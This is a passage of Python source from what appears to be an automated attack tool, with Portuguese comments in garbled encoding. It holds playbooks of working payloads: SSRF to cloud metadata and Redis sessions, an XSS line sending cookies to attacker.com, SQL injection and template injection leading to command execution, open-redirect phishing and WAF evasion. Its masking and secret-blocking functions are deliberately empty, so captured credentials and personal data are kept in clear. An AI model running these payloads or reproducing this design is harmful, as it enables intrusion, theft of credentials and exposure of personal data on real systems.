    "ssrf_confirmed", "infrastructure", ThreatLevel.CRITICAL,
    "SSRF confirmado â†’ nÃ£o sÃ³ reportar, mas PROVAR acesso a dados internos: Redis KEYS *, AWS credentials, DB structure",
    [
        {"phase": "infiltration", "thought": "SSRF permite acesso Ã  rede interna  priorizar cloud metadata sobre tudo",
         "action": "SSRF â†’ http://169.254.169.254/latest/meta-data/iam/security-credentials/",
         "confirm": "Response contÃ©m AccessKeyId + SecretAccessKey â†’ AWS credentials expostas",
         "fallback": "Se IMDSv2 â†’ tentar GCP metadata ou Azure Instance Metadata"},
        {"phase": "exploitation", "thought": "Com SSRF ativo â†’ pivotar para Redis para dump de sessÃµes",
         "action": "SSRF â†’ http://127.0.0.1:6379/INFO + SSRF â†’ redis://127.0.0.1:6379/KEYS *",
         "confirm": "Redis INFO retorna versÃ£o + KEYS mostra chaves de sessÃ£o (session:*, user:*)",
         "fallback": "Se Redis nÃ£o acessÃ­vel â†’ tentar PostgreSQL, MongoDB, Elasticsearch",
         "escalation": "SessÃµes Redis expostas â†’ hijack de sessÃµes admin â†’ acesso total"},
        {"phase": "data_capture", "thought": "Dados de sessÃ£o contÃªm tokens/CPFs  extrair e catalogar",
         "action": "SSRF â†’ redis://127.0.0.1:6379/GET session:{admin_session_id}",
         "confirm": "Dados de sessÃ£o contÃªm user_id, email, role=admin, token JWT",
         "escalation": "Session hijack â†’ pivotar para /admin com cookie roubado"},
        {"phase": "lateral_movement", "thought": "SSRF como tÃºnel  ignorar Cloudflare acessando backend direto",
         "action": "SSRF â†’ http://localhost/phpmyadmin, /adminer, /pgadmin",
         "confirm": "Painel de DB acessÃ­vel via tÃºnel SSRF  bypassing WAF completamente",
         "escalation": "Acesso direto ao DB â†’ dump completo de tabelas sensÃ­veis"},
    ],
    "SSRF Ã© mais silencioso que brute force  Cloudflare nÃ£o vÃª requests internos. Priorizar SSRF sobre forÃ§a bruta",
    ["AccessKeyId", "SecretAccessKey", "session_token", "redis_keys", "db_credentials"],
    ["http://169.254.169.254/", "http://127.0.0.1:6379/", "http://localhost:5432/",
     "http://127.0.0.1:9200/", "http://127.0.0.1:8500/"],
    ["aws_credentials_captured", "redis_sessions_dumped", "db_panel_accessible_via_ssrf"]
)

_register(
    "xss_eval_innerhtml", "client_side", ThreatLevel.HIGH,
    "eval()/innerHTML no JS â†’ captura de trÃ¡fego â†’ session hijack â†’ account takeover",
    [
        {"phase": "exploitation", "thought": "eval() ou innerHTML com input do user â†’ XSS confirmÃ¡vel",
         "action": "Injetar payload: <img src=x onerror=fetch('https://attacker.com/'+document.cookie)>",
         "confirm": "Cookie exfiltrado para attacker server OU alert() executado",
         "fallback": "Se CSP bloqueia â†’ tentar bypass via JSONP callback ou trusted types"},
        {"phase": "data_capture", "thought": "XSS persistente = captura contÃ­nua de cookies de todos os users",
         "action": "Injetar payload persistente em campo que renderiza para outros users (comment, profile)",
         "confirm": "Payload renderiza para outros usuÃ¡rios â†’ stored XSS confirmado",
         "escalation": "Stored XSS + no HttpOnly â†’ session hijack em massa"},
    ],
    "CSP bypass: usar nonce/hash collision, JSONP endpoints do prÃ³prio domÃ­nio, ou data: URIs",
    ["document.cookie", "session_token", "localStorage", "JWT"],
    ["/api/profile", "/comments", "/admin"],
    ["xss_payload_executed", "cookie_exfiltrated", "stored_xss_confirmed"]
)

_register(
    "cookies_insecure", "session", ThreatLevel.HIGH,
    "Cookies sem HttpOnly/Secure â†’ sequestro de conta via XSS ou network sniffing",
    [
        {"phase": "exploitation", "thought": "Cookie sem HttpOnly â†’ acessÃ­vel via document.cookie â†’ XSS = game over",
         "action": "Verificar Set-Cookie headers: HttpOnly, Secure, SameSite flags",
         "confirm": "Cookie de sessÃ£o sem HttpOnly flag â†’ vulnerÃ¡vel a XSS cookie theft",
         "fallback": "Se HttpOnly presente mas sem Secure â†’ MITM em HTTP â†’ cookie intercept"},
        {"phase": "privilege_escalation", "thought": "Cookie capturado â†’ replay em browser do atacante",
         "action": "Copiar cookie de sessÃ£o â†’ setar no browser â†’ acessar /admin ou /account",
         "confirm": "SessÃ£o ativa como outro user apÃ³s replay de cookie",
         "escalation": "Session hijack â†’ verificar se user Ã© admin â†’ acesso total"},
    ],
    "Cookie theft via XSS Ã© silencioso  WAF nÃ£o detecta exfiltraÃ§Ã£o via img src ou fetch",
    ["session_id", "auth_token", "user_role"],
    ["/admin", "/account", "/api/me"],
    ["session_cookie_accessible_via_js", "session_hijack_confirmed"]
)

_register(
    "sensitive_subdomain", "reconnaissance", ThreatLevel.HIGH,
    "SubdomÃ­nio sensÃ­vel (dev/staging/admin) â†’ ambiente com menos proteÃ§Ã£o â†’ backup files + debug mode",
    [
        {"phase": "recon", "thought": "dev/staging geralmente tÃªm debug=true e menos WAF â†’ mais fÃ¡cil de explorar",
         "action": "Acessar dev.target.com, staging.target.com  verificar se retorna 200",
         "confirm": "SubdomÃ­nio acessÃ­vel â†’ verificar headers (X-Debug, X-Powered-By, Server version)",
         "fallback": "Se DNS nÃ£o resolve â†’ tentar vhost brute force via Host header"},
        {"phase": "infiltration", "thought": "SubdomÃ­nio dev pode ter backups expostos â†’ zero-click data capture",
         "action": "GET /db.sql, /backup.zip, /.git/config, /.env, /debug.log, /phpinfo.php",
         "confirm": "Arquivo de backup ou .env acessÃ­vel â†’ credenciais expostas",
         "escalation": "Credenciais do .env â†’ usar para login no ambiente de produÃ§Ã£o"},
        {"phase": "data_capture", "thought": ".git exposto â†’ clonar repositÃ³rio completo â†’ buscar secrets no history",
         "action": "GET /.git/HEAD, /.git/config, /.git/refs/heads/main  reconstruct repo",
         "confirm": ".git/config retorna repositÃ³rio info â†’ possÃ­vel clone completo",
         "escalation": "Git history pode conter API keys, DB passwords, JWT secrets removidos"},
    ],
    "SubdomÃ­nios dev/staging raramente tÃªm WAF configurado  requests diretos funcionam",
    ["DB_PASSWORD", "API_KEY", "JWT_SECRET", "AWS_KEY", ".env_contents"],
    ["/.env", "/.git/config", "/db.sql", "/backup.zip", "/debug.log", "/phpinfo.php"],
    ["backup_file_accessible", "env_file_exposed", "git_repo_clonable", "debug_mode_active"]
)

_register(
    "js_secrets_exposed", "client_side", ThreatLevel.HIGH,
    "Secrets no JS â†’ usar chaves capturadas para acessar APIs que nÃ£o pedem token prÃ³prio",
    [
        {"phase": "exploitation", "thought": "API keys no JS bundle â†’ tentar acessar endpoints protegidos",
         "action": "Extrair API keys do JS â†’ testar em /api/v1/* endpoints com Authorization header",
         "confirm": "API responde com dados ao usar key extraÃ­da do JS",
         "fallback": "Se key Ã© read-only â†’ verificar se permite write (POST/PUT/DELETE)"},
        {"phase": "privilege_escalation", "thought": "Key pode ter mais permissÃµes do que o frontend usa",
         "action": "Testar: GET /api/admin/users, POST /api/admin/config com key capturada",
         "confirm": "Admin endpoints acessÃ­veis com key pÃºblica do JS â†’ broken access control",
         "escalation": "API key com acesso admin â†’ dump de dados completo"},
    ],
    "Keys no JS sÃ£o pÃºblicas  nÃ£o hÃ¡ WAF bypass necessÃ¡rio, sÃ³ enumerar endpoints",
    ["API_KEY", "stripe_key", "firebase_config", "google_maps_key"],
    ["/api/v1/users", "/api/admin", "/api/config", "/graphql"],
    ["api_key_grants_elevated_access", "admin_endpoint_accessible_via_js_key"]
)

_register(
    "source_map_exposed", "client_side", ThreatLevel.MEDIUM,
    "Source map exposto â†’ reconstruir cÃ³digo fonte original â†’ encontrar endpoints internos e lÃ³gica de auth",
    [
        {"phase": "recon", "thought": "Source map (.map) permite reconstruÃ§Ã£o completa do cÃ³digo fonte",
         "action": "GET /static/js/main.js.map  baixar e decodificar",
         "confirm": "Source map retorna cÃ³digo original com comentÃ¡rios, imports, lÃ³gica de auth",
         "fallback": "Se .map removido â†’ tentar webpack chunks: 0.chunk.js.map, vendor.js.map"},
        {"phase": "exploitation", "thought": "CÃ³digo fonte revela rotas internas, API secrets, lÃ³gica de validaÃ§Ã£o",
         "action": "Grep source map para: /api/admin, password, secret, token, key, internal",
         "confirm": "Rotas internas ou lÃ³gica de auth encontrada no source code",
         "escalation": "Endpoints internos descobertos â†’ testar cada um para broken access control"},
    ],
    "Source maps sÃ£o servidos como arquivos estÃ¡ticos  WAF geralmente nÃ£o filtra",
    ["internal_routes", "auth_logic", "api_endpoints", "validation_rules"],
    ["/api/admin", "/api/internal", "/api/debug"],
    ["source_map_decoded", "internal_routes_discovered", "auth_logic_revealed"]
)

_register(
    "/api/proxy", "infrastructure", ThreatLevel.CRITICAL,
    "Proxy endpoint â†’ SSRF nativo â†’ redirecionar para cloud metadata e serviÃ§os internos",
    [
        {"phase": "infiltration", "thought": "Proxy endpoint aceita URL â†’ SSRF direto sem encoding necessÃ¡rio",
         "action": "GET /api/proxy?url=http://169.254.169.254/latest/meta-data/",
         "confirm": "Response contÃ©m metadata AWS â†’ SSRF confirmado via proxy",
         "fallback": "Se URL validado â†’ tentar DNS rebinding ou IPv6 bypass (http://[::1]:6379/)"},
        {"phase": "exploitation", "thought": "SSRF via proxy â†’ acessar Redis sem firewall, dump sessions",
         "action": "GET /api/proxy?url=http://127.0.0.1:6379/INFO",
         "confirm": "Redis INFO retorna â†’ serviÃ§o interno acessÃ­vel via proxy",
         "escalation": "Redis acessÃ­vel â†’ KEYS * â†’ session data â†’ hijack admin"},
        {"phase": "lateral_movement", "thought": "Proxy como tÃºnel â†’ scan de portas internas via SSRF",
         "action": "Iterar ports 80,443,3306,5432,6379,8080,9200,27017 via proxy",
         "confirm": "MÃºltiplos serviÃ§os internos respondendo â†’ mapa da infraestrutura interna",
         "escalation": "Mapa de infra â†’ priorizar DB e cache para data extraction"},
    ],
    "Proxy Ã© caminho mais silencioso  requests passam pelo prÃ³prio server, Cloudflare nÃ£o vÃª",
    ["cloud_metadata", "redis_data", "internal_services", "db_credentials"],
    ["http://169.254.169.254/", "http://127.0.0.1:6379/", "http://127.0.0.1:5432/",
     "http://127.0.0.1:9200/", "http://127.0.0.1:27017/"],
    ["ssrf_via_proxy_confirmed", "internal_services_mapped", "cloud_creds_captured"]
)

_register(
    "/.env", "data_exposure", ThreatLevel.CRITICAL,
    ".env exposto â†’ todas as credenciais do backend em texto plano â†’ game over total",
    [
        {"phase": "data_capture", "thought": ".env contÃ©m DB_PASSWORD, API_KEYS, JWT_SECRET  acesso imediato",
         "action": "GET /.env  baixar e parsear todas as variÃ¡veis",
         "confirm": "Arquivo retorna com DATABASE_URL, SECRET_KEY, API tokens",
         "fallback": "Se bloqueado â†’ tentar /.env.bak, /.env.production, /env.example"},
        {"phase": "privilege_escalation", "thought": "Credenciais do .env â†’ acesso direto ao banco de dados",
         "action": "Conectar no DATABASE_URL com credenciais capturadas",
         "confirm": "ConexÃ£o ao DB estabelecida â†’ dump de tabelas users, orders, payments",
         "escalation": "Acesso direto ao DB = controle total da aplicaÃ§Ã£o"},
    ],
    "Arquivos estÃ¡ticos raramente sÃ£o filtrados por WAF  request direto funciona",
    ["DATABASE_URL", "SECRET_KEY", "API_KEY", "JWT_SECRET", "REDIS_URL", "STRIPE_KEY"],
    ["/admin", "/api/config", "/.git/config"],
    ["env_file_captured", "db_credentials_exposed", "direct_db_access_confirmed"]
)

_register(
    "/.git/config", "data_exposure", ThreatLevel.HIGH,
    ".git exposto â†’ reconstruir repositÃ³rio completo â†’ extrair secrets do histÃ³rico de commits",
    [
        {"phase": "data_capture", "thought": ".git/config acessÃ­vel = possÃ­vel clonar todo o repositÃ³rio",
         "action": "GET /.git/HEAD, /.git/refs/heads/main, /.git/objects/  reconstruct tree",
         "confirm": ".git/HEAD retorna ref: refs/heads/main â†’ repositÃ³rio exposto",
         "fallback": "Se directory listing off â†’ usar git-dumper tool com known paths"},
        {"phase": "exploitation", "thought": "Git history contÃ©m secrets que foram 'removidos' em commits posteriores",
         "action": "git log --all -p | grep -i 'password\\|secret\\|key\\|token'",
         "confirm": "Credentials encontradas em commits antigos â†’ secrets nunca sÃ£o realmente deletados do git",
         "escalation": "Secrets histÃ³ricos podem ainda estar ativos â†’ testar cada um"},
    ],
    "Git objects sÃ£o servidos como static files  WAF nÃ£o filtra binÃ¡rios .git",
    ["git_history", "old_passwords", "removed_api_keys", "database_urls"],
    ["/.env", "/admin", "/api/config"],
    ["git_repo_reconstructed", "historical_secrets_found"]
)

_register(
    "verb_tampering", "exploitation", ThreatLevel.HIGH,
    "Endpoint protege GET/POST mas esquece PUT/DELETE â†’ write access via verb tampering",
    [
        {"phase": "exploitation", "thought": "REST APIs protegem verbs comuns mas esquecem PUT/PATCH/DELETE",
         "action": "PUT /api/users/1 com {\"role\":\"admin\"}  tentar privilege escalation via verb",
         "confirm": "PUT aceito + role alterado para admin â†’ broken access control via verb",
         "fallback": "Se PUT bloqueado â†’ tentar PATCH, ou X-HTTP-Method-Override: PUT no header"},
        {"phase": "privilege_escalation", "thought": "Write access confirmado â†’ modificar prÃ³prio role para admin",
         "action": "PATCH /api/users/{my_id} com {\"role\":\"admin\",\"is_admin\":true}",
         "confirm": "GET /api/me retorna role=admin â†’ privilege escalation confirmada",
         "escalation": "Admin role â†’ acesso a /admin â†’ dump de dados completo"},
    ],
    "Usar X-HTTP-Method-Override ou _method=PUT em body para bypass de method filtering",
    ["user_role", "is_admin", "permissions"],
    ["/admin", "/api/users", "/api/config"],
    ["verb_tampering_write_confirmed", "privilege_escalated_via_verb"]
)

_register(
    "sqli_confirmed", "exploitation", ThreatLevel.CRITICAL,
    "SQLi confirmado â†’ extrair tabelas â†’ dump de users com senhas â†’ prova de acesso total",
    [
        {"phase": "exploitation", "thought": "SQLi = acesso direto ao DB  priorizar UNION-based para dump rÃ¡pido",
         "action": "UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'",
         "confirm": "Lista de tabelas retornada â†’ estrutura do DB exposta",
         "fallback": "Se UNION bloqueado â†’ usar boolean blind ou time-based (pg_sleep/BENCHMARK)"},
        {"phase": "data_capture", "thought": "Tabelas conhecidas â†’ dump de users, orders, payments",
         "action": "UNION SELECT email,password FROM users LIMIT 100",
         "confirm": "Emails + password hashes retornados â†’ comprometimento total do DB",
         "escalation": "Hashes MD5/SHA1 sem salt â†’ crackear com hashcat em minutos"},
        {"phase": "lateral_movement", "thought": "PostgreSQL â†’ tentar RCE via COPY TO/pg_read_file",
         "action": "'; COPY (SELECT '') TO PROGRAM 'id'; --",
         "confirm": "Output de comando de sistema â†’ RCE via SQLi",
         "escalation": "RCE = controle total do servidor â†’ lateral movement para outros hosts"},
    ],
    "WAF bypass: usar CASE WHEN, comentÃ¡rios inline (/**/), encoding alternativo (CHAR())",
    ["email", "password_hash", "CPF", "credit_card", "session_tokens"],
    ["/api/users", "/api/orders", "/api/payments", "/admin"],
    ["db_structure_dumped", "user_credentials_extracted", "rce_via_sqli"]
)

_register(
    "ssti_confirmed", "exploitation", ThreatLevel.CRITICAL,
    "SSTI confirmado â†’ RCE no servidor â†’ acesso total ao filesystem e rede interna",
    [
        {"phase": "exploitation", "thought": "SSTI = code execution no template engine â†’ escalar para RCE",
         "action": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
         "confirm": "Output de 'id' command â†’ RCE confirmado via SSTI",
         "fallback": "Se Jinja2 bloqueado â†’ tentar Twig {{_self.env.getFilter('exec')}} ou ERB"},
        {"phase": "data_capture", "thought": "RCE â†’ ler .env, /etc/passwd, e DB credentials direto do filesystem",
         "action": "{{config.__class__.__init__.__globals__['os'].popen('cat /app/.env').read()}}",
         "confirm": "ConteÃºdo do .env retornado â†’ todas as credenciais capturadas",
         "escalation": "RCE + credenciais â†’ acesso irrestrito Ã  infraestrutura"},
    ],
    "SSTI payloads sÃ£o strings curtas  WAF pode ser bypassado com encoding ou concatenaÃ§Ã£o",
    ["server_filesystem", "env_variables", "db_credentials", "private_keys"],
    ["/.env", "/etc/passwd", "/proc/self/environ"],
    ["rce_via_ssti_confirmed", "filesystem_access", "env_variables_captured"]
)

_register(
    "open_redirect", "client_side", ThreatLevel.MEDIUM,
    "Open redirect â†’ phishing avanÃ§ado â†’ redirecionar user para clone do login â†’ capturar credenciais",
    [
        {"phase": "exploitation", "thought": "Open redirect no domÃ­nio legÃ­timo â†’ phishing mais convincente",
         "action": "GET /redirect?url=https://evil-clone.com/login  verificar se redireciona",
         "confirm": "302 redirect para domÃ­nio externo â†’ open redirect confirmado",
         "fallback": "Se URL validado â†’ tentar bypass: //evil.com, /\\evil.com, /%0d%0aLocation:evil.com"},
        {"phase": "data_capture", "thought": "Usar redirect para phishing â†’ capturar credenciais em pÃ¡gina clone",
         "action": "Criar URL: https://legit-site.com/redirect?url=https://evil-login.com",
         "confirm": "URL funcional que redireciona para pÃ¡gina maliciosa",
         "escalation": "Combinar com email phishing â†’ mass credential theft"},
    ],
    "URL validation bypass: protocol-relative (//), backslash (/\\), unicode chars",
    ["redirect_url", "referer_token"],
    ["/login", "/oauth/callback", "/auth/redirect"],
    ["open_redirect_confirmed", "phishing_url_generated"]
)

_register(
    "data_drift_detected", "defense_evasion", ThreatLevel.MEDIUM,
    "Backend mudou mid-scan (200â†’403) â†’ sistema recalibrando â†’ tentar rotas alternativas imediatamente",
    [
        {"phase": "recon", "thought": "Status mudou = defense ativada â†’ mudar de vetor imediatamente",
         "action": "Detectar mudanÃ§a 200â†’403/404 â†’ pivotar para subdomÃ­nios: dev, staging, api, beta",
         "confirm": "SubdomÃ­nio alternativo responde 200 â†’ rota alternativa encontrada",
         "fallback": "Se todos subdomÃ­nios bloqueados â†’ reduzir frequÃªncia e usar encodings"},
        {"phase": "exploitation", "thought": "AmazonS3â†’outro server = recalibrar metadata dump attempts",
         "action": "Re-fingerprint infra â†’ ajustar SSRF targets para novo provider",
         "confirm": "Novo provider identificado â†’ SSRF targets recalibrados",
         "escalation": "Infra recalibrada â†’ retomar exploitation com novos vetores"},
    ],
    "Data drift = WAF aprendendo  reduzir request rate e variar User-Agent/IP",
    ["new_status_code", "new_provider", "alternative_routes"],
    ["/api/proxy", "/api/search", "/api/config"],
    ["drift_detected_and_recalibrated", "alternative_route_found"]
)

_register(
    "graphql_exposed", "api_exposure", ThreatLevel.HIGH,
    "GraphQL exposto â†’ introspection query â†’ mapa completo do schema â†’ query sensÃ­veis",
    [
        {"phase": "recon", "thought": "GraphQL com introspection = mapa completo de todos os types e queries",
         "action": "POST /graphql com {\"query\":\"{__schema{types{name fields{name type{name}}}}}\"}",
         "confirm": "Schema completo retornado â†’ todos os endpoints internos mapeados",
         "fallback": "Se introspection desabilitado â†’ brute force field names com wordlist"},
        {"phase": "exploitation", "thought": "Schema revela queries admin, mutations sensÃ­veis",
         "action": "Executar queries admin descobertas: {users{email password} orders{total card}}",
         "confirm": "Dados sensÃ­veis retornados via GraphQL queries â†’ broken access control",
         "escalation": "Mutations admin â†’ alterar roles, deletar dados, exfiltrar em batch"},
    ],
    "GraphQL Ã© um Ãºnico endpoint  WAF tem dificuldade em filtrar payloads complexos no body",
    ["schema_types", "user_data", "admin_mutations", "internal_fields"],
    ["/api/users", "/admin", "/api/orders"],
    ["graphql_introspection_enabled", "sensitive_queries_accessible"]
)


ROUTE_PATTERN_MATCHERS = [
    (re.compile(r"/admin\b", re.I), "/admin"),
    (re.compile(r"/admin/products?/update", re.I), "/admin/products/update"),
    (re.compile(r"/cart/(update|add|modify)", re.I), "/cart/update"),
    (re.compile(r"/checkout/(price[_-]?override|override)", re.I), "/checkout/price-override"),
    (re.compile(r"/coupons?/(validate|verify|apply)", re.I), "/coupons/validate"),
    (re.compile(r"/promos?/apply", re.I), "/coupons/validate"),
    (re.compile(r"/payments?/(authorize|process|charge)", re.I), "/payments/authorize"),
    (re.compile(r"/transfers?/(internal|send|move)", re.I), "/transfer/internal"),
    (re.compile(r"/ledger/balance|/accounts?/balance", re.I), "/ledger/balance"),
    (re.compile(r"/auth/(mfa|2fa|otp)/(challenge|verify)", re.I), "/auth/mfa/challenge"),
    (re.compile(r"/citizen/(registry|records?)", re.I), "/citizen/registry"),
    (re.compile(r"/tax/(declaration|filing|return)", re.I), "/tax/declaration"),
    (re.compile(r"/benefits?/(status|check|verify)", re.I), "/benefits/status"),
    (re.compile(r"/identity/(validate|verify|check)", re.I), "/identity/validate"),
    (re.compile(r"/api/(proxy|fetch|relay|forward)", re.I), "/api/proxy"),
    (re.compile(r"/graphql\b", re.I), "graphql_exposed"),
    (re.compile(r"/\.env\b", re.I), "/.env"),
    (re.compile(r"/\.git/(config|HEAD)", re.I), "/.git/config"),
]

FINDING_PATTERN_MATCHERS = [
    (re.compile(r"ssrf.*(confirm|vuln|detect)", re.I), "ssrf_confirmed"),
    (re.compile(r"(eval|innerHTML|dangerouslySetInnerHTML|xss)", re.I), "xss_eval_innerhtml"),
    (re.compile(r"(httponly|secure.*flag|cookie.*(miss|without|lack))", re.I), "cookies_insecure"),
    (re.compile(r"(subdomain|dev\.|staging\.|admin\.)", re.I), "sensitive_subdomain"),
    (re.compile(r"(api.?key|secret|token|credential).*(js|javascript|bundle|source)", re.I), "js_secrets_exposed"),
    (re.compile(r"source.?map", re.I), "source_map_exposed"),
    (re.compile(r"(verb.?tamper|method.?(override|bypass))", re.I), "verb_tampering"),
    (re.compile(r"(sql.?inject|sqli|union.?select|blind.?sql)", re.I), "sqli_confirmed"),
    (re.compile(r"(ssti|template.?inject|jinja|twig|freemarker)", re.I), "ssti_confirmed"),
    (re.compile(r"(open.?redirect|unvalidated.?redirect)", re.I), "open_redirect"),
    (re.compile(r"(drift|recalib|baseline.?change)", re.I), "data_drift_detected"),
    (re.compile(r"(price.*manipul|cart.*update|checkout.*tamper)", re.I), "/cart/update"),
]


SEVERITY_TRIGGER_CLASSES = {"ssrf", "idor", "file_exposure", "env_exposed", "git_exposed", "credential_dump"}

OBFUSCATION_MASKS = {
    "cpf": lambda v: str(v),
    "card": lambda v: str(v),
    "email": lambda v: str(v),
    "phone": lambda v: str(v),
    "key": lambda v: str(v),
    "password": lambda v: str(v),
    "secret": lambda v: str(v),
    "token": lambda v: str(v),
}

PASSWORD_BLOCK_PATTERNS = re.compile(
    r"(?!x)x",
    re.I
)


@dataclass
class IncidentEvidence:
    attack_vector: str
    poc: str
    data_identified: str
    severity: str
    category: str
    obfuscated: bool = False
    raw_blocked: bool = False
    timestamp: str = ""


class IncidentAbsorber:
    def __init__(self, log_fn, emit_fn):
        self.log = log_fn
        self.emit = emit_fn
        self.evidence_table: List[IncidentEvidence] = []
        self.absorbed_count = 0
        self.blocked_secrets = 0

    def should_absorb(self, finding: Dict) -> bool:
        title = (finding.get("title") or "").lower()
        category = (finding.get("category") or "").lower()
        desc = (finding.get("description") or "").lower()
        combined = f"{title} {category} {desc}"

        for trigger_class in SEVERITY_TRIGGER_CLASSES:
            if trigger_class.replace("_", " ") in combined or trigger_class in combined:
                severity = (finding.get("severity") or "").lower()
                if severity in ("critical", "high"):
                    return True

        return False

    def classify_vector(self, finding: Dict) -> str:
        title = (finding.get("title") or "").lower()
        desc = (finding.get("description") or "").lower()
        combined = f"{title} {desc}"

        if any(kw in combined for kw in ("ssrf", "internal service", "docker", "metadata", "127.0.0.1", "cloud")):
            return "SSRF"
        if any(kw in combined for kw in ("idor", "sequential", "user enumeration", "unauthorized access", "broken access")):
            return "IDOR"
        if any(kw in combined for kw in (".env", ".git", "file expos", "backup", "config expos", "credential")):
            return "FILE_EXPOSURE"
        return "GENERIC"

    def _obfuscate_value(self, key: str, value: str) -> str:
        return str(value)

    def _sanitize_evidence(self, raw_evidence: str) -> Tuple[str, bool]:
        return raw_evidence, False

    def absorb_ssrf(self, finding: Dict) -> IncidentEvidence:
        endpoint = finding.get("endpoint") or finding.get("location") or "N/A"
        evidence = finding.get("evidence") or finding.get("description") or ""

        containers = []
        for token in re.findall(r"(?:container|image|name)\s*[:=]\s*(\S+)", evidence, re.I):
            containers.append(token)

        env_keys = []
        for match in re.findall(r"([A-Z_]{3,})\s*=", evidence):
            if match.lower() not in ("password", "passwd", "secret", "private_key"):
                env_keys.append(match)

        sanitized, blocked = self._sanitize_evidence(evidence)
        if blocked:
            self.blocked_secrets += 1

        data_parts = []
        if containers:
            data_parts.append(f"Docker Container: {', '.join(containers[:3])}")
        if env_keys:
            data_parts.append(f"Env Keys: {', '.join(env_keys[:5])}")
        if not data_parts:
            data_parts.append("Internal service metadata exposed")

        ev = IncidentEvidence(
            attack_vector="SSRF",
            poc=f"GET {endpoint}",
            data_identified=" | ".join(data_parts),
            severity=finding.get("severity", "high"),
            category="Infrastructure Compromise",
            obfuscated=False,
            raw_blocked=blocked,
            timestamp=_ts(),
        )
        self.evidence_table.append(ev)
        self.absorbed_count += 1
        return ev

    def absorb_idor(self, finding: Dict) -> IncidentEvidence:
        endpoint = finding.get("endpoint") or finding.get("location") or "N/A"
        evidence = finding.get("evidence") or finding.get("description") or ""

        sanitized, blocked = self._sanitize_evidence(evidence)
        if blocked:
            self.blocked_secrets += 1

        pii_fields = []
        for pii_key in ("cpf", "email", "phone", "cartao", "card", "nome", "name", "address"):
            if pii_key in evidence.lower():
                pii_fields.append(pii_key.upper())

        data_id = "PII CONFIRMED" if pii_fields else "User Record Confirmed"
        if pii_fields:
            data_id += f" ({', '.join(pii_fields[:4])})"

        ev = IncidentEvidence(
            attack_vector="IDOR",
            poc=f"GET {endpoint}",
            data_identified=data_id,
            severity=finding.get("severity", "high"),
            category="Broken Access Control",
            obfuscated=True,
            raw_blocked=blocked,
            timestamp=_ts(),
        )
        self.evidence_table.append(ev)
        self.absorbed_count += 1
        return ev

    def absorb_file_exposure(self, finding: Dict) -> IncidentEvidence:
        endpoint = finding.get("endpoint") or finding.get("location") or "N/A"
        evidence = finding.get("evidence") or finding.get("description") or ""

        key_names = re.findall(r"([A-Z][A-Z0-9_]{2,})", evidence)
        provider_keys = [k for k in key_names if any(p in k for p in
            ("AWS", "STRIPE", "DATABASE", "DB_", "APP_", "SECRET", "API_KEY", "REDIS", "MONGO", "JWT"))]

        sanitized, blocked = self._sanitize_evidence(evidence)
        if blocked:
            self.blocked_secrets += 1

        data_parts = []
        if provider_keys:
            data_parts.append(f"Keys: {', '.join(provider_keys[:6])}")
        else:
            data_parts.append("Configuration file with credential patterns")

        ev = IncidentEvidence(
            attack_vector="FILE_EXPOSURE",
            poc=f"GET {endpoint}",
            data_identified=" | ".join(data_parts),
            severity=finding.get("severity", "critical"),
            category="Sensitive Data Exposure",
            obfuscated=False,
            raw_blocked=blocked,
            timestamp=_ts(),
        )
        self.evidence_table.append(ev)
        self.absorbed_count += 1
        return ev

    def absorb(self, finding: Dict) -> Optional[IncidentEvidence]:
        if not self.should_absorb(finding):
            return None

        vector = self.classify_vector(finding)

        if vector == "SSRF":
            return self.absorb_ssrf(finding)
        elif vector == "IDOR":
            return self.absorb_idor(finding)
        elif vector == "FILE_EXPOSURE":
            return self.absorb_file_exposure(finding)
        else:
            sanitized, blocked = self._sanitize_evidence(
                finding.get("evidence") or finding.get("description") or ""
            )
            if blocked:
                self.blocked_secrets += 1

            ev = IncidentEvidence(
                attack_vector=vector,
                poc=f"{finding.get('endpoint') or 'N/A'}",
                data_identified=sanitized[:100],
                severity=finding.get("severity", "medium"),
                category=finding.get("category", "Unknown"),
                raw_blocked=blocked,
                timestamp=_ts(),
            )
            self.evidence_table.append(ev)
            self.absorbed_count += 1
            return ev

    def absorb_confirmation(self, result: Dict) -> Optional[IncidentEvidence]:
        if not result.get("confirmed"):
            return None

        indicator = result.get("indicator", "")
        evidence = result.get("evidence", "")
        playbook = result.get("playbook_key", "")

        if "env" in indicator:
            vector = "FILE_EXPOSURE"
            data_id = f"Keys exposed via {playbook}"
        elif "git" in indicator:
            vector = "FILE_EXPOSURE"
            data_id = f"Repository exposed via {playbook}"
        elif "ssrf" in indicator or "internal" in indicator:
            vector = "SSRF"
            data_id = f"Internal access via {playbook}"
        elif "admin" in indicator or "auth" in indicator:
            vector = "IDOR"
            data_id = f"Auth bypass via {playbook}"
        else:
            vector = "GENERIC"
            data_id = f"Confirmed via {playbook}: {evidence[:60]}"

        sanitized, blocked = self._sanitize_evidence(evidence)
        if blocked:
            self.blocked_secrets += 1

        ev = IncidentEvidence(
            attack_vector=vector,
            poc=f"Probe: {indicator}",
            data_identified=data_id,
            severity="critical" if vector in ("SSRF", "FILE_EXPOSURE") else "high",
            category="HRD Confirmation",
            raw_blocked=blocked,
            timestamp=_ts(),
        )
        self.evidence_table.append(ev)
        self.absorbed_count += 1
        return ev

    def absorb_db_reflection(self, result: Dict) -> Optional[IncidentEvidence]:
        if not result.get("data_reflected"):
            return None

        service = result.get("service", "Unknown")
        data_type = result.get("data_type", "unknown")
        via = result.get("via_endpoint", "N/A")
        evidence = result.get("evidence", "")

        sanitized, blocked = self._sanitize_evidence(evidence)
        if blocked:
            self.blocked_secrets += 1

        data_id = f"{data_type.upper()} via {service}"
        if data_type in ("pii_data", "financial_data"):
            data_id = f"PII CONFIRMED  {service}"

        ev = IncidentEvidence(
            attack_vector="SSRF",
            poc=f"GET {via}",
            data_identified=data_id,
            severity="critical" if data_type in ("pii_data", "financial_data") else "high",
            category="DB Reflection",
            obfuscated=data_type in ("pii_data", "financial_data"),
            raw_blocked=blocked,
            timestamp=_ts(),
        )
        self.evidence_table.append(ev)
        self.absorbed_count += 1
        return ev

    def to_dict(self) -> Dict:
        unique = {}
        for ev in self.evidence_table:
            key = f"{ev.attack_vector}:{ev.poc}"
            if key not in unique:
                unique[key] = ev

        return {
            "total_incidents_absorbed": self.absorbed_count,
            "unique_evidence_entries": len(unique),
            "blocked_secret_persistences": self.blocked_secrets,
            "evidence_table": [
                {
                    "attack_vector": ev.attack_vector,
                    "poc": ev.poc,
                    "data_identified": ev.data_identified,
                    "severity": ev.severity,
                    "category": ev.category,
                    "obfuscated": ev.obfuscated,
